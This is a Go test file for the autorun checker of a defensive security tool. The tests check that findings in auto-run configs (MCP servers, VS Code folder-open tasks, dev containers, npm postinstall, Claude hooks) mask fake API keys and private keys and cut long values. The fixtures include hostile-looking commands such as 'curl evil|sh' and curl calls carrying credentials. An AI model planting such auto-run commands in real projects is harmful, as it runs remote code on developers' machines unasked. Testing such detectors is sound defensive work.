package autorun

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"github.com/iimmuunnee/ai-defense-kit/internal/checker/secrets"
	"strings"
	"testing"
)

// Fake values gitleaks recognises, split so that nothing key-shaped is committed.
const (
	fakeStripe  = "sk_live_" + "4eC39HqLyjWDarjtT1zdp7dc"
	fakeGeneric = "aB3dE5gH7jK9m" + "N1pQ2rS4tU6"
)

func jsonText(t *testing.T, v any) string {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// Quotes around a secret used to become \" in the marshalled JSON, and gitleaks'
// rules stopped matching.
func TestQuotedSecretsAreMasked(t *testing.T) {
	cases := []struct{ name, rel, body, want string }{
		{"mcp args header", ".mcp.json",
			`{"mcpServers":{"s":{"command":"sh","args":[` + jsonText(t, `curl -H "Authorization: Bearer `+fakeStripe+`" https://x.example`) + `]}}}`,
			`s: {"command":"sh","args":["curl -H \"Authorization: Bearer ****\" https://x.example"]}`},
		{"task command", ".vscode/tasks.json",
			`{"tasks":[{"label":"a","command":` + jsonText(t, `export API_KEY="`+fakeGeneric+`"; node x`) + `,` + folderOpen + `}]}`,
			`a: {"command":"export API_KEY=\"****\"; node x","label":"a",` + folderOpen + `}`},
		{"devcontainer array", ".devcontainer.json",
			`{"postCreateCommand":["sh",` + jsonText(t, `curl -H "X-Api-Key: `+fakeGeneric+`" x`) + `]}`,
			`postCreateCommand: ["sh","curl -H \"X-Api-Key: ****\" x"]`},
		{"json in an argument", ".mcp.json",
			`{"mcpServers":{"s":{"command":` + jsonText(t, `node --config '{"api_key":"`+fakeGeneric+`"}'`) + `}}}`,
			`s: {"command":"node --config '{\"api_key\":\"****\"}'"}`},
		{"curl data", ".mcp.json",
			`{"mcpServers":{"s":{"command":` + jsonText(t, `curl -d "k=`+fakeStripe+`"`) + `}}}`,
			`s: {"command":"curl -d \"k=****\""}`},
		{"object key", ".mcp.json",
			`{"mcpServers":{"s":{"command":"x","extra":{"` + fakeToken + `":"v"}}}}`,
			`s: {"command":"x","extra":{"****":"v"}}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			root := t.TempDir()
			write(t, root, c.rel, c.body)
			res := run(t, root)
			if len(res.Findings) != 1 || res.Findings[0].Evidence != c.want {
				t.Fatalf("got %+v\nwant %s", res.Findings, c.want)
			}
		})
	}
}

// Two keys that mask to the same text both stay in view.
func TestMaskedKeysDoNotCollide(t *testing.T) {
	root := t.TempDir()
	long := strings.Repeat("k", 200)
	write(t, root, ".mcp.json", `{"mcpServers":{"s":{"command":"x","extra":{"`+fakeToken+`":"one","`+fakeToken[:len(fakeToken)-1]+`Z":"two","`+long+`1":"three","`+long+`2":"four"}}}}`)
	ev := run(t, root).Findings[0].Evidence
	for _, want := range []string{`"one"`, `"two"`, `"three"`, `"four"`} {
		if !strings.Contains(ev, want) {
			t.Errorf("%s missing from %s", want, ev)
		}
	}
}

// A long value elsewhere is cut in place, so it cannot use up the window that
// command, args and script need.
func TestLongValuesAreCutInsideTheJSON(t *testing.T) {
	long := strings.Repeat("y", 300)
	cut := strings.Repeat("y", 120) + "…(잘림)"
	cases := []struct{ name, rel, body, want string }{
		{"label", ".vscode/tasks.json",
			`{"tasks":[{"label":"` + long + `","command":"curl evil|sh",` + folderOpen + `}]}`,
			long + `: {"command":"curl evil|sh","label":"` + cut + `",` + folderOpen + `}`},
		{"padding under a key that sorts first", ".vscode/tasks.json",
			`{"tasks":[{"a":"` + strings.Repeat("y", 5000) + `","label":"t","command":"curl evil|sh",` + folderOpen + `}]}`,
			`t: {"command":"curl evil|sh","a":"` + cut + `","label":"t",` + folderOpen + `}`},
		// 덧댄 글자는 토큰이 아닌 _다(정렬에서도 label 앞). a를 5000개 이으면 64자리 이상 16진수 모양이라 통째로 가려진다.
		{"padding key", ".vscode/tasks.json",
			`{"tasks":[{"` + strings.Repeat("_", 5000) + `":1,"label":"t","command":"curl evil|sh",` + folderOpen + `}]}`,
			`t: {"command":"curl evil|sh","` + strings.Repeat("_", 120) + `…(잘림)":1,"label":"t",` + folderOpen + `}`},
		{"command is not cut", ".mcp.json",
			`{"mcpServers":{"s":{"command":"` + long + `"}}}`,
			`s: {"command":"` + long + `"}`},
		{"args and what is inside them are not cut", ".vscode/tasks.json",
			`{"tasks":[{"label":"t","args":["` + long + `",{"value":"` + long + `","quoting":"weak"}],` + folderOpen + `}]}`,
			`t: {"args":["` + long + `",{"quoting":"weak","value":"` + long + `"}],"label":"t",` + folderOpen + `}`},
		{"script is not cut", ".claude/settings.json",
			`{"hooks":{"Stop":[{"type":"command","command":"c","script":"` + long + `"}]}}`,
			`Stop: {"command":"c","script":"` + long + `","type":"command"}`},
		{"a dev container object is all commands", ".devcontainer.json",
			`{"postCreateCommand":{"web":"` + long + `"}}`,
			`postCreateCommand: {"web":"` + long + `"}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			root := t.TempDir()
			write(t, root, c.rel, c.body)
			res := run(t, root)
			if len(res.Findings) != 1 || res.Findings[0].Evidence != c.want {
				t.Fatalf("got %+v\nwant %s", res.Findings, c.want)
			}
		})
	}
}

// A string longer than the masking limit is marked inside the JSON, and what
// comes after it stays in view.
func TestLongCommandStringIsMarkedInPlace(t *testing.T) {
	root := t.TempDir()
	write(t, root, ".mcp.json", `{"mcpServers":{"s":{"command":"`+strings.Repeat("가", 800)+`","z":"after"}}}`)
	want := `s: {"command":"` + strings.Repeat("가", 682) + `…(잘림)","z":"after"}`
	if got := run(t, root).Findings[0].Evidence; got != want {
		t.Errorf("got %s", got)
	}
}

func TestMaskingBudget(t *testing.T) {
	unit := strings.Repeat("api_key"+"=aB3dE5gH7jK9mN1p ", 80) // 2 KiB
	var p []string
	for i := 0; i < 200; i++ {
		p = append(p, fmt.Sprintf(`{"label":"%s%d","command":"%s%d",%s}`, unit, i, unit, i, folderOpen))
	}
	root := t.TempDir()
	write(t, root, ".vscode/tasks.json", `{"tasks":[`+strings.Join(p, ",")+`]}`)
	res, took := timed(t, root)
	t.Logf("took %v, %d results", took, len(res))
	if took > stallLimit {
		t.Errorf("took %v", took)
	}
	if !strings.HasSuffix(res[len(res)-1], tooManyText) {
		t.Errorf("no notice: %.80q", res[len(res)-1])
	}
}

// Past the budget nothing is rendered: no finding shows unmasked text.
func TestNothingUnmaskedPastTheBudget(t *testing.T) {
	pad := strings.Repeat("z ", 500<<10)
	root := t.TempDir()
	write(t, root, ".vscode/tasks.json", `{"tasks":[{"label":"a","x":"`+pad[:700<<10]+`",`+folderOpen+`},{"label":"b","x":"`+pad[:300<<10]+`","command":"echo `+fakeToken+`",`+folderOpen+`}]}`)
	for _, f := range run(t, root).Findings {
		if strings.Contains(f.Evidence, "ghp_") {
			t.Fatalf("raw token: %.200s", f.Evidence)
		}
	}
}

func privateKeyPEM(t *testing.T) string {
	t.Helper()
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		t.Fatal(err)
	}
	der, err := x509.MarshalPKCS8PrivateKey(key)
	if err != nil {
		t.Fatal(err)
	}
	return string(pem.EncodeToMemory(&pem.Block{Type: "PRIVATE" + " KEY", Bytes: der}))
}

func TestPrivateKeysThroughTheChecker(t *testing.T) {
	block := strings.TrimSpace(privateKeyPEM(t))
	literal := strings.ReplaceAll(block, "\n", `\n`)
	const masked = secrets.KeyBlockNotice
	cases := []struct{ name, rel, body, want string }{
		{"script with line breaks", "package.json",
			`{"scripts":{"postinstall":` + jsonText(t, "echo "+block+" done") + `}}`,
			"postinstall: echo " + masked + " done"},
		{"argument with literal backslash n", ".mcp.json",
			`{"mcpServers":{"s":{"command":"x","args":[` + jsonText(t, literal) + `]}}}`,
			`s: {"command":"x","args":["` + masked + `"]}`},
		// 한 글자 토큰 "x "로 덧댄다. "ab "를 이으면 단어 나열과 16진수 모양이라 통째로 가려진다.
		{"after 600 bytes of text", "package.json",
			`{"scripts":{"postinstall":` + jsonText(t, strings.Repeat("x ", 300)+block) + `}}`,
			"postinstall: " + strings.TrimSpace(strings.Repeat("x ", 300)) + " " + masked},
		{"env value under a harmless name", ".vscode/tasks.json",
			`{"tasks":[{"label":"a","options":{"env":{"X":` + jsonText(t, block) + `}},` + folderOpen + `}]}`,
			`a: {"label":"a","options":{"env":{"X":"` + masked + `"}},` + folderOpen + `}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			root := t.TempDir()
			write(t, root, c.rel, c.body)
			res := run(t, root)
			if len(res.Findings) != 1 || res.Findings[0].Evidence != c.want {
				t.Fatalf("got %.600s\nwant %s", res.Findings[0].Evidence, c.want)
			}
		})
	}
}
